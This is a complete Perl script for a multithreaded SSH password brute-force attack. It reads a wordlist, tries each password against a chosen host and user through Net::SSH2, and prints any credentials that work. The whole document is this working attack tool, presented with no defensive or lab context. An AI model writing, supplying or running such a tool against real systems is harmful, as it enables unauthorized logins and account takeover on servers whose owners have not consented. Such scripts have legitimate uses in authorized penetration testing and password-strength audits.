#!/usr/bin/perl

use strict;
use warnings;
use threads;
use Thread::Queue;
use Getopt::Long;
use Net::SSH2;

my $host = '';
my $port = 22;
my $user = '';
my $wordlist = '';
my $threads = 4;
my $timeout = 10;

GetOptions(
    'host=s'     => \$host,
    'port=i'     => \$port,
    'user=s'     => \$user,
    'wordlist=s' => \$wordlist,
    'threads=i'  => \$threads,
    'timeout=i'  => \$timeout,
) or die "Error in command line arguments\n";

die "Missing required arguments\n" unless $host && $user && $wordlist;

print "Starting SSH brute force on $host:$port\n";
print "Target: $user\n";
print "Threads: $threads\n";
print "Timeout: $timeout seconds\n";
print "----------------------------------------\n";

# Load wordlist
open(my $fh, '<', $wordlist) or die "Could not open wordlist: $!";
my @passwords = <$fh>;
chomp @passwords;
close $fh;
print "Loaded " . scalar(@passwords) . " passwords\n";

# Create queue
my $password_queue = Thread::Queue->new();
my $result_queue = Thread::Queue->new();

# Add passwords to queue
$password_queue->enqueue(@passwords);

# Worker subroutine
sub worker {
    while (my $password = $password_queue->dequeue_nb()) {
        my $ssh2 = Net::SSH2->new();
        if ($ssh2->connect($host, $port)) {
            if ($ssh2->auth_password($user, $password)) {
                $result_queue->enqueue("[SUCCESS] $user:$password");
                $ssh2->disconnect();
                last;
            }
            $ssh2->disconnect();
        }
    }
}

# Create threads
my @threads;
for (1..$threads) {
    push @threads, threads->create(\&worker);
}

# Wait for results
while (my $result = $result_queue->dequeue()) {
    print "$result\n";
    $_->kill() foreach @threads;
    exit 0;
}

# Wait for all threads to finish
$_->join() foreach @threads;
print "No valid credentials found\n";
